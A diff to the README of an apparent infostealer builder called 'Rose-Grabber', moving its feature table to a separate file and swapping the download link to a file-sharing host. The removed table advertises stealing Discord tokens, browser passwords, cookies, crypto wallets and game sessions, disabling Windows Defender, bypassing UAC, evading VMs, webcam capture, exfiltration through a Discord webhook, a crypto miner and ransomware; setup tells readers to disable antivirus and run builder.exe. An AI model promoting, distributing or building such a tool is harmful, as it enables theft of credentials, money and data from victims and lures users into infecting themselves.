@@ -32,48 +32,7 @@
 </div>
 
 ### Features
-
-| Feature                               | Description                                                                                                                                                                                                          | Status |
-|---------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------|
-| GUI Builder                           | Create user-friendly interfaces easily.                                                                                                                                                                              | Done   |
-| UAC Bypass                            | Bypass User Account Control for elevated privileges.                                                                                                                                                                 | Done   |
-| Custom Icon                           | Set a unique icon for your application.                                                                                                                                                                              | Done   |
-| Runs On Startup                       | Automatically start with Windows.                                                                                                                                                                                    | Done   |
-| Disables Windows Defender             | Disable built-in antivirus protection and firewalls.                                                                                                                                                                 | Done   |
-| Anti-VM                               | Detect and evade virtual machine environments.                                                                                                                                                                       | Done   |
-| Blocks AV-Related Sites               | Prevent access to antivirus websites.                                                   | Done   |
-| Melt Stub                             | Make the malware difficult to detect by self-destructing.                                                                                                                                                            | Done   |
-| Fake Error                            | Display fake error messages to deceive users.                                                                                                                                                                        | Done   |
-| EXE Binder                            | Combine multiple files into a single executable.                                                                                                                                                                     | Later  |
-| File Pumper                           | Inflate file sizes to hide malicious content.                                                                                                                                                                        | Done   |
-| Obfuscated Code                       | Use code obfuscation techniques for evasion.                                                                                                                                                                         | Done  |
-| Discord Injection                     | Inject code into Discord processes.                                                                                                                                                                                  | Done   |
-| Steals Discord Tokens                 | Extract user tokens from Discord.                                                                                                                                                                                    | Done   |
-| Mass DM Discord Friends               | DM's every user on the victims discord accounts friendlist.                                                                                                                                                          | Done   |
-| Steals Steam Session                  | Gather active Steam sessions.                                                                                                                                                                                        | Done   |
-| Steals Epic Session                   | Gather active Epic Games sessions.                                                                                                                                                                                   | Done   |
-| Steals Uplay Session                  | Gather active Uplay sessions.                                                                                                                                                                                        | Done   |
-| Steals Passwords From Many Browsers   | Extract stored passwords.                                                                                                                                                                                            | Done   |
-| Steals Cookies From Many Browsers     | Collect browser cookies.                                                                                                                                                                                             | Done   |
-| Steals History From Many Browsers     | Access browsing history.                                                                                                                                                                                             | Done   |
-| Steals Autofills From Many Browsers   | Extract autofill data.                                                                                                                                                                                               | Later  |
-| Steals Minecraft Session Files        | Gather Minecraft session information.                                                                                                                                                                                | Done   |
-| Steals Telegram Session Files         | Extract Telegram session data.                                                                                                                                                                                       | Done   |
-| Steals Crypto Wallets                 | Target cryptocurrency wallets.                                                                                                                                                                                       | Done   |
-| Steals Roblox Cookies                 | Gather Roblox-related data.                                                                                                                                                                                          | Done   |
-| Steals IP Information                 | Collect IP addresses.                                                                                                                                                                                                | Done   |
-| Steals System Info                    | Gather system-specific details.                                                                                                                                                                                      | Done   |
-| Steals Saved Wifi Passwords           | Extract saved Wi-Fi passwords.                                                                                                                                                                                       | Done   |
-| Steals Common Files                   | Collect files commonly used for attacks.                                                                                                                                                                             | Later  |
-| Captures Screenshot                   | Take screenshots of the user's desktop.                                                                                                                                                                              | Done   |
-| Captures Webcam Image                 | Access and capture webcam images.                                                                                                                                                                                    | Done   |
-| Sends All Data Through Discord Webhook | Send stolen data to specified destinations.                                                                                                                                                                          | Done   |
-| File Type Selection                   | Choose between screensaver or executable.                                                                                                                                                                            | Done   |
-| Trigger BSOD                          | Cause a Blue Screen of Death.                                                                                                                                                                                        | Done   |
-| Freeze Screen                         | Freeze the user's screen.                                                                                                                                                                                            | Later  |
-| Spread Malware                        | Send malicious messages to friends on social media.                                                                                                                                                                  | Later  |
-| Crypto Miner                          | Use the victim's computer for cryptocurrency mining.                                                                                                                                                                 | Done  |
-| Ransomware                            | Forces the victim to pay you a specific amount of USD in Monero or they will lose all their data
+Find features [here](https://github.com/Fuydutdtu/Rose-Grabber/blob/main/FEATURES.md)
 
 ### Disclaimer
 
@@ -84,7 +43,7 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 ### Setup
 
 **Before proceeding, briefly disable your antivirus to avoid accidental removal of important components. Install Python properly, ensuring it's added to PATH. Preferably, use Python 3.11 and uninstall other versions. Thanks!**
-- Download repository [here](https://filetransfer.io/data-package/TcLZ5qnY#link)
+- Download repository [here](https://fastupload.io/en/HbybYDKtmQAuuZy/file)
 - Extract the zip file.
 - Launch UI by executing builder.exe
 
